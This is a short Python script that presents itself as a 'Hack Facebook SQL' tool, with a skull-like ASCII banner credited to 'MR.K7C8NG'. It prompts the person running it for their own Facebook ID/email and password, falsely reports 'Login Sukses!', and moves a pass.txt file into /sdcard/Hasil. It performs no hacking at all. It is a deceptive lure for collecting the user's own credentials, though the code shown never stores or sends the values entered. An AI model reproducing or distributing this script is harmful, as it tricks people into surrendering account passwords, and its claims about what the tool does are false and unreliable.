
#!/bin/usr/python

"""
	Hack FACBOOK SQL
"""

import os
import sys
from time import sleep

def ketik(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 1000)

os.system('clear')
print ("""\033[1;31m
         WELCOME TO HACK FACEBOOK SQL
\033[1;31m   ██__________██
___█▒█________█▒█
__█▒███____███▒█
__█▒████████▒▒█
__█▒████▒▒█▒▒██
__████▒▒▒▒▒████
___█▒▒▒▒▒▒▒████
__█▒▒▒▒▒▒▒▒████______█                            _██▒█▒▒▒▒▒█▒▒████__█▒█
_█▒█●█▒▒▒█●█▒▒███_█▒▒█
_█▒▒█▒▒▒▒▒█▒▒▒██_█▒▒█
__█▒▒▒=▲=▒▒▒▒███_██▒█
__██▒▒█♥█▒▒▒▒███__██▒█
____███▒▒▒▒████____█▒█
______██████________███
_______█▒▒████______██
_______█▒▒▒▒▒████__██
_______█▒██▒██████▒█     MR.K7C8NG
_______█▒███▒▒▒█████
_____█▒████▒▒▒▒████
______█▒███▒██████__
""")

id = input('\033[1;96m[+]\x1b[1;93mID/Email\x1b[1;91m:\x1b[1;92m')
sleep (0.5)
pwd = input('\033[1;96m[+]\x1b[1;93mpassword\x1b[1;91m:\x1b[1;92m')
os.system('clear')
print ("\033[1;32m Login Sukses! ")
ketik ("\033[1;33m terimakasih bro 👍 ")
os.system('clear')
os.system('mkdir /sdcard/Hasil')
os.system('mv pass.txt /sdcard/Hasil')
